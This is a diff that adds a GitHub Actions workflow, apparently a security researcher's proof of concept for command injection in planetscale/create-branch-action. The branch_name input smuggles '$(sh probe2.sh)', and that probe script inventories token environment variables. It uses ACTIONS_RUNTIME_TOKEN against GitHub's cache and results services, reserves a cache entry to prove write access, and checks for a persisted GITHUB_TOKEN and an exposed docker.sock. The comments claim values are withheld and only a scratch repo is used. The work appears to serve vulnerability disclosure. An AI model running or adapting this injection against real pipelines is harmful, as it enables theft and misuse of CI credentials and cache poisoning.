@@ -1,0 +1,85 @@
+name: poc4-tokens
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  tokens:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Write probe2
+        run: |
+          cat > probe2.sh <<'PROBE'
+          #!/bin/sh
+          # RCE-E task 2 probe: token/capability inventory INSIDE the action container.
+          # Names only for token-ish env vars; token VALUES are never printed. The only
+          # side effect is a 1-byte cache reservation against the SCRATCH repo's cache
+          # service to establish write scope; no host/docker state is touched.
+          TAG="${1:-x}"
+          OUT="/github/workspace/tok_${TAG}.txt"
+          SOCK=/var/run/docker.sock
+          
+          {
+          echo "########## TOKEN PROBE tag=${TAG} ##########"
+          echo "== env var names =="; env | sed 's/=.*//' | sort | tr '\n' ' '; echo
+          echo "== token-ish env var names =="; env | sed 's/=.*//' | grep -E 'TOKEN|SECRET|KEY|CACHE|RESULT|RUNTIME|ARTIFACT' | sort | tr '\n' ' '; echo
+          if [ -n "$GITHUB_TOKEN" ]; then echo "GITHUB_TOKEN env: PRESENT"; else echo "GITHUB_TOKEN env: absent"; fi
+          if [ -n "$ACTIONS_RUNTIME_TOKEN" ]; then echo "ACTIONS_RUNTIME_TOKEN env: PRESENT (value withheld)"; else echo "ACTIONS_RUNTIME_TOKEN env: absent"; fi
+          echo "ACTIONS_CACHE_URL host: $(echo "$ACTIONS_CACHE_URL" | sed 's#https\?://##; s#/.*##')"
+          echo "ACTIONS_RESULTS_URL host: $(echo "$ACTIONS_RESULTS_URL" | sed 's#https\?://##; s#/.*##')"
+          echo "ACTIONS_RUNTIME_URL host: $(echo "$ACTIONS_RUNTIME_URL" | sed 's#https\?://##; s#/.*##')"
+          
+          echo "== runtime token vs api.github.com (expect 401: not a GH API token) =="
+          if [ -n "$ACTIONS_RUNTIME_TOKEN" ]; then
+            G=$(curl -s -o /dev/null -w '%{http_code}' --max-time 8 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" https://api.github.com/user)
+            echo "api.github.com/user with runtime token -> HTTP $G"
+          fi
+          
+          echo "== cache v1 read query with toolkit headers =="
+          if [ -n "$ACTIONS_CACHE_URL" ]; then
+            C1=$(curl -s -o /tmp/c1.body -w '%{http_code}' --max-time 8 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H 'Accept: application/json;api-version=6.0-preview.1' "$ACTIONS_CACHE_URL/_apis/artifactcache/cache?keys=rcee&version=rcee")
+            echo "GET _apis/artifactcache/cache -> HTTP $C1 body: $(head -c 160 /tmp/c1.body 2>/dev/null)"
+          fi
+          
+          echo "== cache v1 reserve (proves write scope; scratch repo only, 1 byte) =="
+          if [ -n "$ACTIONS_CACHE_URL" ]; then
+            C2=$(curl -s -o /tmp/c2.body -w '%{http_code}' --max-time 8 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H 'Content-Type: application/json' -H 'Accept: application/json;api-version=6.0-preview.1' -X POST -d '{"key":"rcee-probe","version":"rcee-probe","cacheSize":1}' "$ACTIONS_CACHE_URL/_apis/artifactcache/cache")
+            echo "POST reserve -> HTTP $C2 body: $(head -c 160 /tmp/c2.body 2>/dev/null)"
+          fi
+          
+          echo "== results service twirp probe (status + Location host only) =="
+          if [ -n "$ACTIONS_RESULTS_URL" ]; then
+            R=$(curl -s -D /tmp/r.hdr -o /dev/null -w '%{http_code}' --max-time 8 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H 'Content-Type: application/json' -X POST -d '{"key":"rcee","restoreKeys":[],"version":"rcee"}' "$ACTIONS_RESULTS_URL/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL")
+            echo "POST GetCacheEntryDownloadURL -> HTTP $R"
+            grep -i '^location:' /tmp/r.hdr | sed 's#\(https\?://[^/]*\).*#\1#' | head -2
+          fi
+          
+          echo "== workspace .git/config auth extraheader (value withheld) =="
+          if [ -f /github/workspace/.git/config ] && grep -q 'extraheader' /github/workspace/.git/config 2>/dev/null; then
+            echo "PRESENT: GITHUB_TOKEN persisted in .git/config http.extraheader (readable from action container)"
+          else
+            echo "absent"
+          fi
+          
+          echo "== docker.sock still there (context) =="
+          ls -la "$SOCK" 2>&1
+          echo "########## TOKEN PROBE END tag=${TAG} ##########"
+          } >> "$OUT" 2>&1
+          exit 0
+          PROBE
+          chmod +x probe2.sh
+      - name: create-branch-action token probe
+        uses: planetscale/create-branch-action@allow-duplicates
+        continue-on-error: true
+        with:
+          org_name: "poc-org"
+          database_name: "pocdb"
+          branch_name: 'x$(sh /github/workspace/probe2.sh tok)end'
+          check_exists: "false"
+      - name: Print evidence
+        run: |
+          echo "--- tok_tok.txt ---"
+          cat tok_tok.txt || echo "no file"
